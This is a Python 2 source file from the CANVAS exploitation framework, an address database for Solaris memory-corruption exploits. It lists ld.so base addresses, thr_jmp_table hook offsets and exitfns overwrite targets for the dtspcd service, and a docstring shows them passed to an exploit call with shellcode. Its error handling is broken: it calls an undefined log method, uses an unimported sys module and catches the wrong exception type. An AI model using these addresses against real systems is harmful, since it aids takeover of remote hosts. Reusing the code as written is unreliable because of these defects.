#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

class SolarisAddress:
    """class for basic Solaris address gathering requirments"""
    def __init__(self):
        self.rel5db = {"5.6": 6, "5.7": 7, "5.8": 8, "5.9": 9, "5.10": 10}
        self.rel2db = {"2.6": 6, "2.7": 7, "2.8": 8, "2.9": 9, "2.10": 10}

    def rel_normalize(self, rel):
        #normalize 5.6, 5.7, 5.8, 5.9, 5.10
        #normalize 2.6, 2.7, 2.8, 2.9, 2.10
        try:
            if int(rel) in range(6,10):
                return int(rel)
        except:
            pass
    
        try:
            return self.rel5db[rel]
        except:
            pass
        
        try:
            return self.rel2db[rel]
        except:
            raise ValueError, "No such solaris release in address db" +\
        " - known releases are " + str(self.rel5db.keys()) + str(self.rel2db.keys())

class SolarisLdSo(SolarisAddress):
    """class for thr_jmp_table and ldso base
    usage:
        d = addressdb.SolarisLdSo()
        ldso_base = d.get_ldso_base("8")
        hookaddr = d.get_ldso_hook("8")
        for each in hookaddr:
            exploit(ldso_base + each, shelladdy)
    """

    def __init__(self):
        SolarisAddress.__init__(self)
        #release: [list of all known thr_jmp_table]
        self.addrdb = { 6: [], 7: [], 8: [ 0x321b4, 0x361d8, 0x361e0, 0x37298, 0x381e8 ], 9: [ 0x000381e8, 0x000361ec ], 10: [ 0x0003c238 ]}
        #release: addr of ldsobase
        self.basedb = { 6: 0, 7: 0xff3b0000L, 8: 0xff3b0000L, 9: 0xff3c0000L, 10: 0xFF3B0000L }

    def get_ldso_base(self, rel):
        rl = self.rel_normalize(rel)	
        if rl in range(6,11):
            return self.basedb[rl]
        else:
            raise ValueError, "No such solaris release in address db" +\
        " - known releases are " + str(self.rel5db.keys()) + str(self.rel2db.keys())

    def get_ldso_hook(self, rel):	
        rl = self.rel_normalize(rel)	
        if rl in range(6,11):
            return self.addrdb[rl]
        else:
            raise ValueError, "No such solaris release in address db" +\
        " - known releases are " + str(self.rel5db.keys()) + str(self.rel2db.keys())

class SolarisExitfns(SolarisAddress):
    """class for (solaris 2.6, 7) &exitfns (Solaris 8, 9) &static_mem+1"""
    def __init__(self):
        SolarisAddress.__init__(self)
        
        #FILL this with addies for specific app
        self.addrdb_dtspcd = { 6: [0xef62b72cL, 0xef5e9524L, 0xef628c04L, 0xef628c64L, 0xef628f14L, 0xef628f5cL, 0xef62b434L, 0xef6280acL, 0xdf62b434L],\
                        7: [0xff23824cL, 0xff233850L, 0xff2383ccL, 0xff23a26cL, 0xff23bc5cL, 0xff23bfe4L, 0xff23bd74L, 0xff239cfcL, 0xff239c34L],\
                        8: [0xff23ca14L, 0xff23e0b0L, 0xff23e0a0L, 0xff23dfd4L, 0xff23bfb0L, 0xdf63dfc8L, 0xff1be0b0L],\
                        9: [], 10: []}
        #empty slot
        self.addrdb_testapp = { 6: [], 7: [], 8: [], 9: [], 10: []}
        
        #FILL this with appnames
        self.app2addrdb = { "dtspcd": self.addrdb_dtspcd, "testapp": self.addrdb_testapp }

    def get_exitfns_hook(self, rel, app="dtspcd"):	
        rl = self.rel_normalize(rel)	
        if rl in range(6,11):
            print "Querying address database for application: %s and Solaris release: %s" % (app, str(rel))
            try:
                dict = self.app2addrdb[app]
            except ValueError:
                raise ValueError, "No such application in address database" +\
                      " - known applications are " + str(self.app2addrdb.keys())
            except:
                self.log("Broken application dictonary. Please ask for fix.")
                import traceback
                print '-'*60
                traceback.print_exc(file=sys.stdout)
                print '-'*60
                
            return dict[rl]
            #return self.addrdb[rl]
            
        else:
            raise ValueError, "No such solaris release in address db" +\
        " - known releases are " + str(self.rel5db.keys()) + str(self.rel2db.keys())

class SolarisPLT(SolarisAddress):
    """
    class for PLT base for various modules. require executable and module name
    PLT is read/write/exec, good for heap overflows.
    """
    def __init__(self):
        SolarisAddress.__init__(self)

class LinuxGOT:
    """require rmp string, GOT entry string, library ..."""
    def __init__(self):
        pass
